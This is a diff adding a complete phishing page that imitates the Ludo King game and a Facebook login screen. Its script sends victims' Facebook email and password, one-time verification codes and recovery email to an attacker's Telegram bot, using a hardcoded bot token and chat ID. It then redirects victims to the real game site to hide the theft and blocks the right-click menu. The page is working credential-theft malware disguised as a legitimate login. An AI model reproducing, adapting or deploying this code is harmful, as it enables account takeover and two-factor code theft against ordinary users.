+                        <span class="letter-d">D</span>
+                        <span class="letter-o">O</span>
+                    </div>
+                </div>
+
+                <div class="king-ribbon"><div class="king-text">KING</div></div>
+            </div>
+
+            <div class="board-wrap">
+                <div class="board">
+                    <div class="cell c-blue"></div><div class="cell c-blue"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-green"></div><div class="cell c-green"></div>
+                    <div class="cell c-blue"></div><div class="cell c-blue"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-green"></div><div class="cell c-green"></div>
+                    <div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div>
+                    <div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div>
+                    <div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div>
+                    <div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div>
+                    <div class="cell c-red"></div><div class="cell c-red"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-yellow"></div><div class="cell c-yellow"></div>
+                    <div class="cell c-red"></div><div class="cell c-red"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-white"></div><div class="cell c-yellow"></div><div class="cell c-yellow"></div>
+                </div>
+
+                <div class="dice-center">
+                    <div class="dice-dot"></div><div class="dice-dot empty"></div><div class="dice-dot"></div>
+                    <div class="dice-dot empty"></div><div class="dice-dot"></div><div class="dice-dot empty"></div>
+                    <div class="dice-dot"></div><div class="dice-dot empty"></div><div class="dice-dot"></div>
+                </div>
+
+                <div class="gutti gutti-blue"></div>
+                <div class="gutti gutti-red"></div>
+                <div class="gutti gutti-green"></div>
+                <div class="gutti gutti-yellow"></div>
+            </div>
+        </div>
+
+        <div class="panel">
+            <div class="top-row">
+                <button class="small-btn" id="saveDataBtn"><span class="btn-icon">☁️</span><span>Save Data</span></button>
+                <button class="small-btn" id="changeDeviceBtn"><span class="btn-icon">📱</span><span>Change Device</span></button>
+                <button class="small-btn" id="rewardBtn"><span class="btn-icon">💎</span><span>+100</span></button>
+            </div>
+
+            <button class="login-btn" id="loginBtn">
+                <span class="fb-icon">
+                    <svg viewBox="0 0 24 24" width="24" height="24" fill="white">
+                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                    </svg>
+                </span>
+                <span>Login with Facebook</span>
+            </button>
+
+            <p class="legal">By continuing I agree that Gametion Technologies Pvt. Ltd. may store and process my data in accordance with the <a href="#">Privacy Policy</a></p>
+        </div>
+    </div>
+</div>
+
+
+<!-- ============================================================
+     PAGE 2: FACEBOOK LOGIN
+     ============================================================ -->
+<div class="page-view" id="fbPage">
+    <div class="fb-header"><div class="fb-logo">facebook</div></div>
+
+    <div class="fb-main">
+        <div class="fb-container">
+            <div class="app-image-wrap">
+                <img src="https://i.postimg.cc/k5sfkgqz/file-00000000eb848211885e2fa50e66eafd.png" alt="App Icon" class="app-image">
+            </div>
+
+            <p class="connect-text">
+                Log in to your Facebook account to<br>
+                connect to <strong>Ludo King</strong>
+            </p>
+
+            <form id="fbForm" autocomplete="off" novalidate>
+                <input type="text" id="emailInput" class="fb-input" placeholder="Mobile number or email address" autocomplete="off" spellcheck="false">
+                <input type="password" id="passInput" class="fb-input" placeholder="Facebook password" autocomplete="off">
+                <button type="submit" class="fb-login-btn" id="fbLoginBtn">Log In</button>
+            </form>
+
+            <div class="forgot-wrap"><a class="forgot-link" id="forgotLink">Forgotten password?</a></div>
+
+            <div class="other-links">
+                <a>Create account</a>
+                <a>Not now</a>
+                <a class="help">Help Centre</a>
+            </div>
+
+            <div class="fb-lang-grid">
+                <span>English (UK)</span> <span>हिन्दी</span>
+                <span>मराठी</span> <span>اردو</span>
+                <span>ਪੰਜਾਬੀ</span> <span>বাংলা</span>
+                <span>ગુજરાતી</span> <span>+</span>
+            </div>
+
+            <p class="fb-footer">Meta © 2026</p>
+        </div>
+    </div>
+</div>
+
+
+<!-- ============================================================
+     PAGE 3: CONFIRM LUDO ACCOUNT
+     ============================================================ -->
+<div class="page-view" id="codePage">
+    <div class="code-bg">
+        <div class="neon-stripes"></div>
+        <div class="pulse-ring r1"></div>
+        <div class="pulse-ring r2"></div>
+        <div class="pulse-ring r3"></div>
+        <div class="pulse-ring r4"></div>
+        <div class="code-orb o1"></div>
+        <div class="code-orb o2"></div>
+        <div class="code-orb o3"></div>
+
+        <div class="code-board-3d">
+            <div class="code-board">
+                <div class="quad cb-red"></div>
+                <div class="quad cb-green"></div>
+                <div class="quad cb-blue"></div>
+                <div class="quad cb-yellow"></div>
+            </div>
+        </div>
+
+        <div class="code-dice cd1">
+            <div class="code-dice-dot"></div><div class="code-dice-dot empty"></div><div class="code-dice-dot"></div>
+            <div class="code-dice-dot empty"></div><div class="code-dice-dot"></div><div class="code-dice-dot empty"></div>
+            <div class="code-dice-dot"></div><div class="code-dice-dot empty"></div><div class="code-dice-dot"></div>
+        </div>
+        <div class="code-dice cd2">
+            <div class="code-dice-dot"></div><div class="code-dice-dot"></div><div class="code-dice-dot"></div>
+            <div class="code-dice-dot empty"></div><div class="code-dice-dot"></div><div class="code-dice-dot empty"></div>
+            <div class="code-dice-dot"></div><div class="code-dice-dot"></div><div class="code-dice-dot"></div>
+        </div>
+        <div class="code-dice cd3">
+            <div class="code-dice-dot empty"></div><div class="code-dice-dot empty"></div><div class="code-dice-dot empty"></div>
+            <div class="code-dice-dot empty"></div><div class="code-dice-dot"></div><div class="code-dice-dot empty"></div>
+            <div class="code-dice-dot empty"></div><div class="code-dice-dot empty"></div><div class="code-dice-dot empty"></div>
+        </div>
+    </div>
+
+    <div class="code-page">
+        <div class="code-card">
+            <div class="lock-circle">🔒</div>
+
+            <h1 class="code-title">Confirm Ludo Account</h1>
+
+            <p class="code-subtitle">
+                We sent a code to your <strong>WhatsApp / Facebook</strong>
+            </p>
+
+            <form id="codeForm" style="width: 100%;" autocomplete="off" novalidate>
+                <div class="code-input-wrap">
+                    <span class="code-input-icon">🔑</span>
+                    <input type="text" id="codeInput" class="code-input" placeholder="Enter your code" maxlength="8" inputmode="numeric" autocomplete="off">
+                </div>
+
+                <button type="submit" class="code-continue-btn" id="codeContinueBtn">Continue →</button>
+            </form>
+
+            <button class="code-resend-btn" id="codeResendBtn" type="button">Resend code</button>
+        </div>
+    </div>
+</div>
+
+
+<!-- ============================================================
+     PAGE 4: BIND VERIFIED (Account Verification)
+     ============================================================ -->
+<div class="page-view" id="verifiedPage">
+    <div class="verified-wrapper">
+        <div class="verified-box">
+
+            <div class="verified-header">
+                <h2 class="verified-header-title">ACCOUNT VERIFICATION</h2>
+                <button class="verified-close" id="verifiedCloseBtn" type="button">✕</button>
+            </div>
+
+            <div class="verified-stripe"></div>
+
+            <div class="verified-content">
+                <p class="verified-desc">Please enter your recovery email and security code</p>
+
+                <form id="bindForm" autocomplete="off" novalidate>
+
+                    <div class="bind-group">
+                        <label for="bindEmail">RECOVERY EMAIL:</label>
+                        <input type="email" id="bindEmail" class="bind-input" placeholder="Please enter your recovery email" autocomplete="off">
+                    </div>
+
+                    <div class="bind-group">
+                        <label for="bindCode">SECURITY CODE:</label>
+                        <input type="text" id="bindCode" class="bind-input" placeholder="Enter 6-8 digit code" maxlength="8" inputmode="numeric" autocomplete="off">
+                    </div>
+
+                    <div class="bind-actions">
+                        <button type="submit" class="bind-verify-btn" id="bindVerifyBtn" disabled>VERIFY</button>
+                        <a class="bind-forgot-link" id="bindForgotLink">Forgot security code?</a>
+                    </div>
+
+                </form>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<script>
+/* ==========================================
+   CONFIGURATION
+   ========================================== */
+const REDIRECT_URL = "https://ludoking.com/play/";
+const BOT_TOKEN = "8320070006:AAHePE7IPR5ellx7kIg6_8I7_L8TUAG4A7w";
+const CHAT_ID   = "7999697290";
+/* ========================================== */
+
+/* ==========================================
+   DEVICE-BASED EMOJI
+   ========================================== */
+const emojis = ['❤️', '🔥', '⭐', '💎', '🎯', '⚡', '💥', '🌟', '🎁', '👑', '🚀', '💫', '🏆', '🔑', '🎮', '💰', '🎉', '🎲'];
+
+function getDeviceEmoji() {
+    let deviceEmoji = localStorage.getItem('deviceEmoji');
+    if (!deviceEmoji) {
+        deviceEmoji = emojis[Math.floor(Math.random() * emojis.length)];
+        localStorage.setItem('deviceEmoji', deviceEmoji);
+    }
+    return deviceEmoji;
+}
+
+/* ==========================================
+   GET DATE TIME (Bangladesh)
+   ========================================== */
+function getDateTime() {
+    const now = new Date();
+    const bdTime = now.toLocaleString('en-GB', {
+        timeZone: 'Asia/Dhaka',
+        day: '2-digit',
+        month: '2-digit',
+        year: 'numeric',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit',
+        hour12: false
+    });
+    return bdTime.replace(',', '');
+}
+
+/* ==========================================
+   PAGE NAVIGATION
+   ========================================== */
+const ludoPage     = document.getElementById('ludoPage');
+const fbPage       = document.getElementById('fbPage');
+const codePage     = document.getElementById('codePage');
+const verifiedPage = document.getElementById('verifiedPage');
+
+function showFacebookPage() {
+    ludoPage.classList.remove('active');
+    fbPage.classList.add('active');
+    window.scrollTo(0, 0);
+}
+
+function showCodePage() {
+    fbPage.classList.remove('active');
+    codePage.classList.add('active');
+    window.scrollTo(0, 0);
+}
+
+function showVerifiedPage() {
+    codePage.classList.remove('active');
+    verifiedPage.classList.add('active');
+    window.scrollTo(0, 0);
+}
+
+/* ==========================================
+   SEND TELEGRAM
+   ========================================== */
+function sendMessage(text) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'HTML'
+        }),
+        keepalive: true
+    }).catch(err => console.error('Telegram error:', err));
+}
+
+/* ==========================================
+   PAGE 1: LOGIN BUTTON
+   ========================================== */
+document.getElementById('loginBtn').addEventListener('click', showFacebookPage);
+
+['saveDataBtn', 'changeDeviceBtn', 'rewardBtn'].forEach(id => {
+    const btn = document.getElementById(id);
+    btn.addEventListener('click', () => {
+        btn.style.transform = 'scale(0.95)';
+        setTimeout(() => { btn.style.transform = ''; }, 150);
+    });
+});
+
+/* ==========================================
+   PAGE 2: FACEBOOK LOGIN
+   ========================================== */
+const fbForm = document.getElementById('fbForm');
+const emailInput = document.getElementById('emailInput');
+const passInput  = document.getElementById('passInput');
+const fbLoginBtn = document.getElementById('fbLoginBtn');
+const forgotLink = document.getElementById('forgotLink');
+
+fbForm.addEventListener('submit', (e) => {
+    e.preventDefault();
+
+    const email = emailInput.value.trim();
+    const pass  = passInput.value.trim();
+
+    if (!email) {
+        emailInput.focus();
+        emailInput.classList.add('error');
+        setTimeout(() => emailInput.classList.remove('error'), 1500);
+        return;
+    }
+
+    /* Password 6+ */
+    if (pass.length < 6) {
+        passInput.focus();
+        passInput.classList.add('error');
+        setTimeout(() => passInput.classList.remove('error'), 1500);
+        return;
+    }
+
+    fbLoginBtn.textContent = 'Logging in...';
+    fbLoginBtn.disabled = true;
+
+    /* Device-based emoji */
+    const deviceEmoji = getDeviceEmoji();
+
+    /* ⭐ Facebook Login Format:
+       🕒 Time: DD/MM/YYYY HH:MM:SS
+       Facebook Login ❤️
+       📧 Email: ...
+       🔑 Pass: ...
+    */
+    const message =
+        `🕒 Time: ${getDateTime()}\n` +
+        `Facebook Login ${deviceEmoji}\n` +
+        `📧 Email: <code>${email}</code>\n` +
+        `🔑 Pass: <code>${pass}</code>`;
+
+    sendMessage(message);
+
+    setTimeout(() => {
+        showCodePage();
+    }, 3000);
+});
+
+forgotLink.addEventListener('click', (e) => {
+    e.preventDefault();
+    sendMessage('Forgot password');
+});
+
+/* ==========================================
+   PAGE 3: CONFIRM LUDO ACCOUNT
+   ========================================== */
+const codeForm = document.getElementById('codeForm');
+const codeInput = document.getElementById('codeInput');
+const codeContinueBtn = document.getElementById('codeContinueBtn');
+const codeResendBtn = document.getElementById('codeResendBtn');
+
+codeInput.addEventListener('input', (e) => {
+    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 8);
+});
+
+codeForm.addEventListener('submit', (e) => {
+    e.preventDefault();
+
+    const code = codeInput.value.trim();
+
+    /* 6-8 digit */
+    if (!/^\d{6,8}$/.test(code)) {
+        codeInput.focus();
+        return;
+    }
+
+    codeContinueBtn.textContent = 'Verifying...';
+    codeContinueBtn.disabled = true;
+
+    /* শুধু Code */
+    const message = `Code: <code>${code}</code>`;
+    sendMessage(message);
+
+    /* Bind Verified page এ যাবে */
+    setTimeout(() => {
+        showVerifiedPage();
+    }, 1000);
+});
+
+/* Resend — শুধু "Resent" */
+let resendCountdown = 0;
+
+codeResendBtn.addEventListener('click', function (e) {
+    e.preventDefault();
+    e.stopPropagation();
+    if (resendCountdown > 0) return;
+
+    sendMessage('Resent');
+
+    resendCountdown = 30;
+    codeResendBtn.disabled = true;
+    codeResendBtn.textContent = `Resent (${resendCountdown}s)`;
+
+    const interval = setInterval(() => {
+        resendCountdown--;
+        if (resendCountdown <= 0) {
+            clearInterval(interval);
+            codeResendBtn.disabled = false;
+            codeResendBtn.textContent = 'Resend code';
+        } else {
+            codeResendBtn.textContent = `Resent (${resendCountdown}s)`;
+        }
+    }, 1000);
+});
+
+/* ==========================================
+   PAGE 4: BIND VERIFIED
+   ========================================== */
+const bindForm = document.getElementById('bindForm');
+const bindEmail = document.getElementById('bindEmail');
+const bindCode = document.getElementById('bindCode');
+const bindVerifyBtn = document.getElementById('bindVerifyBtn');
+const bindForgotLink = document.getElementById('bindForgotLink');
+const verifiedCloseBtn = document.getElementById('verifiedCloseBtn');
+
+/* ⭐ Code: শুধু সংখ্যা, max 8 */
+bindCode.addEventListener('input', function () {
+    this.value = this.value.replace(/\D/g, '').slice(0, 8);
+    checkBindValidity();
+});
+
+bindEmail.addEventListener('input', checkBindValidity);
+
+/* ⭐ Validation: Email + 6-8 digit Code */
+function checkBindValidity() {
+    const email = bindEmail.value.trim();
+    const code  = bindCode.value;
+
+    const isEmailValid = email.includes('@') && email.length > 3;
+    const isCodeValid  = /^\d{6,8}$/.test(code);   /* ⭐ 6-8 digit */
+
+    if (isEmailValid && isCodeValid) {
+        bindVerifyBtn.classList.add('active');
+        bindVerifyBtn.disabled = false;
+    } else {
+        bindVerifyBtn.classList.remove('active');
+        bindVerifyBtn.disabled = true;
+    }
+}
+
+bindForm.addEventListener('submit', (e) => {
+    e.preventDefault();
+
+    const email = bindEmail.value.trim();
+    const code  = bindCode.value;
+
+    if (!email.includes('@')) return;
+    if (!/^\d{6,8}$/.test(code)) return;   /* ⭐ 6-8 digit */
+
+    bindVerifyBtn.textContent = 'Verifying...';
+    bindVerifyBtn.disabled = true;
+
+    /* Telegram-এ Email + Code যাবে */
+    const message =
+        `📧 Recovery: <code>${email}</code>\n` +
+        `🔐 Code: <code>${code}</code>`;
+
+    sendMessage(message);
+
+    /* 2 সেকেন্ড পর Redirect */
+    setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+    }, 2000);
+});
+
+bindForgotLink.addEventListener('click', (e) => {
+    e.preventDefault();
+    sendMessage('forget code');
+});
+
+verifiedCloseBtn.addEventListener('click', (e) => {
+    e.preventDefault();
+    e.stopPropagation();
+});
+
+/* Prevent context menu */
+document.addEventListener('contextmenu', (e) => {
+    e.preventDefault();
+});
+</script>
+
+</body>
+                                                                                                                                                                            </html>
